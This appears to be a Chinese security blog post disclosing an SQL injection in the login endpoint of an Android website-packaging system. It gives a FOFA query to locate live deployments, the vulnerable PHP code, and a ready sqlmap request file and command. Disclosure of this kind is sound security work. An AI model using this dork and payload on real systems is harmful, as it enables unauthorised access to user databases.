#  某Android网址封装系统存在SQL注入漏洞   
原创 Swimt  星悦安全   2024-05-28 18:20  
  
**漏洞简介**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=13&wx_lazy=1&tp=wxpic "")  
  
  
    Android网址封装系统可以将网址打包封装成APK(暂不支持打包成IOS 应用),类似于变色龙打包APP,不过现在网上打包APP的都开始收费(100软妹币/年)和实名了  
  
源码带安装教程和常见问题的解决方案,这只是一个demo.  
  
  
**资产详情**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=13&wx_lazy=1&tp=wxpic "")  
  
```
fofa：body="暂未提供找回密码服务"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c7eWAB9vWLgFkFc66MnFCqadCfPhgFEc62qcJHcyOiazAMakeX8K3KGIq6RpU4sU1eFXej2N3Wmdw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c7eWAB9vWLgFkFc66MnFCqaicdTVRm2oR9LSk8RcyUrW6DDqNrxvRiaVMHV1Q4Vcu4ZycObBCTMbNw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
  
**漏洞复现**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
  
**在 api.php 中，GET传入user参数并直接插入进sql语句中导致注入产生.**  
```
<?include 'sql.php';?>

<?php
$wwwrootdir=__DIR__;/*拿到根目录*/
$action=$_GET['action'];
if($action=='login'){//登录
	$user=$_POST['user'];
	$pass=md5($_POST['pass']);
	$sql="select * from `rookie_user` where user='$user'";
	$result = mysqli_query($con,$sql);
	$row = mysqli_fetch_array($result, 3);  
    if (!mysqli_num_rows($result))  
	{  
		print_r(json_encode(array("code"=>0,"info"=>"账号不存在","key"=>""),320));	
	}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c7eWAB9vWLgFkFc66MnFCqFHiaKj7CPtRqCCiaBS53CrMC6I4fLnYSO6RPCL4iaSVOjsYlYGic5Ric6jA/640?wx_fmt=png&from=appmsg "")  
  
**sqlmap 数据包:**  
```
POST /api.php?action=login HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 9
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1
Origin: http://127.0.0.1
Referer: http://127.0.0.1/api.php?action=login
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

user=*
```  
  
**python sqlmap.py -r a.txt --level=3 --dbms=mysql**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c7eWAB9vWLgFkFc66MnFCqzk4G1dIhxWOhKY9aw0BFpfXZiblHdd6Q4bzAQwbJ2m3U2l0dT9SibTEQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
  
**免责声明**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/HVNK6rZ71oofHnCicjcYq2y5pSeBUgibJg8K4djZgn6iaWb6NGmqxIhX2oPlRmGe6Yk0xBODwnibFF8XCjxhEV3K7w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
    **文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
